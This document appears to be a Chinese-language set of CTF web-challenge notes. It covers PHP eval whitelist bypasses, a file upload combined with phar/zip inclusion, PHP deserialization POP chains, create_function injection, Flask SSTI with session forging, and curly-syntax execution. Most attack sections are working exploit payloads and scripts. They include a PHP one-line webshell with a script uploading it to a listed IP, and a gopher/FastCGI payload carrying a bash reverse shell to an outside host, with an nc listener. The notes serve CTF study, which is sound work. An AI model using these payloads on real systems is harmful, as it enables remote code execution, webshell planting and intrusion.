


## Love math

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

* 动态函数
php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数
例如：`$function = "sayHello";$function();`

* php中函数名默认为字符串
例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择

思路1 --
方法1
```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat%20/flag
```
base_convert(696468,10,36) => "exec"
dechex(1598506324)  => "_GET"
$pi(8768397090111664438,10,30) => "getallheaders" 

方法2 -- getallheaders
burp抓包在Content-Length下一行，不加空行, 将1:cat /flag作为header传入了
Content-Length: 11
1: cat /flag

exec(getallheaders(){1}) //操作xx和yy 对应cat /flag，中间用逗号隔开，echo都能输出 echo xx,yy

方法3: 强制传参
exp=cat /flag&abs=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){abs}($$pi{exp})
```
base_convert(37907361743,10,36)  => hex2bin
dechex(1598506324)               => 5f474554  即 _GET 的 16进制
($$pi){abs}($$pi{exp})           => $GET['abs']('exp')
```
思路2 --

直接想办法catflag也是可以的

```
//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
```

思路3 --
前面都是利用白名单的数学函数将数字转成字符串，其实也可以
这是fuzz脚本

```
<?php
$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($k=1;$k<=sizeof($payload);$k++){
    for($i = 0;$i < 9; $i++){
        for($j = 0;$j <=9;$j++){
            $exp = $payload[$k] ^ $i.$j;
            echo($payload[$k]."^$i$j"."==>$exp");
            echo "<br />";
        }
    }
}

```

`http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag`



# 文件上传

## test.bugku-web-upload—文件上传与文件包含组合

提示1 
```php
include.php
```
提示2
```
Tips: the parameter is file! :)
<!-- upload.php -->
```

1.读取源码。 这里过滤了base64, 和.php。末尾不要留.php
include.php?file=php://filter/read=convert.base64-encode/resource=include
include.php?file=php://filter/string.rot13/resource=include.php
include.php?file=php://filter/string.rot13/resource=include

2.上传文件一句木马加zip。用phar或zip协议读取

```python
import zipfile

def make_zipfile(filename, zipname='spam.zip'):
    with zipfile.ZipFile(zipname, 'w') as myzip:
        myzip.write(filename)


if __name__=="__main__":
    with open('basic.php', 'w') as f:
        f.write('<?php eval($_POST["cmd"]);')
    make_zipfile('basic.php', 'basic.zip')

```
```python
import requests

url = 'http://106.14.120.231:28805/upload.php'
key = 'file'
filename = 'basic.zip'

data = {'submit': ''}
proxies = {'http': 'http://127.0.0.1:8080'}
def upload_file(filename, upload_filename=None):
    if upload_filename is None:
        upload_filename = filename
    file = open(filename, 'rb').read()  # create an empty demo file
    files = {key: (upload_filename, file, 'image/jpeg')}
    send_request(data, filename, files, proxies, upload_filename)


def send_request(data, filename, files, proxies, upload_filename=None):
    res = requests.post(url, files=files, data=data, proxies=proxies)


if __name__ == '__main__':
    upload_file('basic.zip', 'basic.jpg')
```
读取内容, 成功后用蚁剑连接
```python
import requests

url = 'http://106.14.120.231:28805/include.php'
proxies = {'http': 'http://127.0.0.1:8080'}
res = requests.post(url+ '?file=phar://upload/basic.jpg/basic', data={'cmd': 'phpinfo();'}, proxies=proxies)
print(res.text)
```

# php 反序列化
## [第五空间 2021]pklovecloud
```php
<?php
//include 'flag.php';
class pkshow
{
    function echo_name()
    {
        return "Pk very safe^.^";
    }
}

class acp
{
    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {
        $this->cinder = new pkshow;
    }
    function __toString()
    {
        if (isset($this->cinder))
            return $this->cinder->echo_name();
    }
}

class ace
{
    public $filename;
    public $openstack;
    public $docker;
    function echo_name()
    {
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
            $file = "./{$this->filename}";
            if (file_get_contents($file))
            {
                return file_get_contents($file);
            }
            else
            {
                return "keystone lost~";
            }
        }
    }
}

if (isset($_GET['pks']))
{
    $logData = unserialize($_GET['pks']);
    echo $logData;
}
else
{
    highlight_file(__file__);
}
?>
```

exp

```php
<?php

class acp
{
    protected $cinder;
    public $neutron;
    public $nova;
    function __construct($cinder){
        $this->nova = &$this->neutron;
        $this->cinder = $cinder;
    }
}

class ace
{
    public $filename = "flag.php";
    public $docker;
    function __construct($docker){
        $this->docker = $docker;
    }
}

echo urlencode(serialize(new acp(new ace(serialize(new acp(""))))));

//$b = serialize(new acp(""));
//$c = new ace($b);
//$d = new acp($c);
//echo urlencode(serialize($d));
```
# 执行漏洞

## 2020BJDCTF “EzPHP”
https://www.gem-love.com/ctf/770.html

```php
<?php
$myFunc = create_function('$a', '$b', 'return($a+$b);')
print_r($myFunc(1,2));
```

实际上 myFunc() 就相当于:
```php
function myFunc($a, $b){
    return $a+$b;
}
```

这看似正常，实则充满危险。由于 $code 可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：
```php
<?php
$myFunc = create_function('$a, $b', 'return($a+$b);}eval($_GET[\'c\']);//');
```

# SSTI

## SSTI | 入门 | [FBCTF2019]Event

随便注册进入发现 event_important 存在 ssti注入。

post `event_important=__class__.__init__.__globals__[app].config` 获得secret key

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route('/')
def index():
    print(session_serializer.dumps("admin"))

index()
```

`python exp.py` 得到最终的cookie

在devtools - Application - Cookies 替换user，再访问admin panel

# 能源大赛

php5的情况下
https://www.bbsmax.com/A/6pdDvoERJw/
”PHP的curly systax能导致代码执行，它将执行花括号间的代码，并将结果替换回去，如下例:
<?php $var = "I was innocent until ${`ls`}" appeared here; ?>"

```
//http://106.14.120.231:22808/?whoami[admin]=d41d8cd98f00b204e9800998ecf8427e&code=9${`cat%20/f???`};${require(
```

# 2021陇原战疫

## eaaasyphp
原题改编，在 Geek Challenge 2021中有

https://wp.n03tack.top/posts/14620/#eaaasyphp

题目
```php
<?php

class Check {
    public static $str1 = false;
    public static $str2 = false;
}


class Esle {
    public function __wakeup()
    {
        Check::$str1 = true;
    }
}


class Hint {

    public function __wakeup(){
        $this->hint = "no hint";
    }

    public function __destruct(){
        if(!$this->hint){
            $this->hint = "phpinfo";
            ($this->hint)();
        }  
    }
}


class Bunny {

    public function __toString()
    {
        if (Check::$str2) {
            if(!$this->data){
                $this->data = $_REQUEST['data'];
            }
            file_put_contents($this->filename, $this->data);
        } else {
            throw new Error("Error");
        }
    }
}

class Welcome {
    public function __invoke()
    {
        Check::$str2 = true;
        return "Welcome" . $this->username;
    }
}

class Bypass {

    public function __destruct()
    {
        if (Check::$str1) {
            ($this->str4)();
        } else {
            throw new Error("Error");
        }
    }
}

if (isset($_GET['code'])) {
    unserialize($_GET['code']);
} else {
    highlight_file(__FILE__);
}
```


解题过程

```php
<?php

class Esle
{
}

class Hint
{
    public function __construct()
    {
        $this->hint = "phpinfo";
    }
}


class Bunny
{
    public function __construct()
    {
        $this->filename = "ftp://bbb@wgf4242.51vip.biz:36956/aaa";
        $this->data = urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxxxx/5000%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00");
    }
}

class Welcome
{
    public function __construct()
    {
        $this->username = new Bunny();
    }
}

class Bypass
{

    public function __construct()
    {
        $this->str4 = new Welcome();
    }
}
echo urlencode(serialize(array(new Esle(), new Bypass())));
```


首先使用 gopherus 生成payload：
```
gopherus --exploit fastcgi
/var/www/html/index.php
bash -c "bash -i >& /dev/tcp/wgf4242.51vip.biz/39672 0>&1"
得到
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH110%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00n%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/wgf4242.51vip.biz/39672%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

1.$this->data的Payload只要`_`后面的内容

```
%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH110%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00n%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/wgf4242.51vip.biz/39672%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```
2.ftp地址使用映射地址。

本地监听 39672  对应的端口 我花生壳映射的是2333
`nc -lvp 2333`

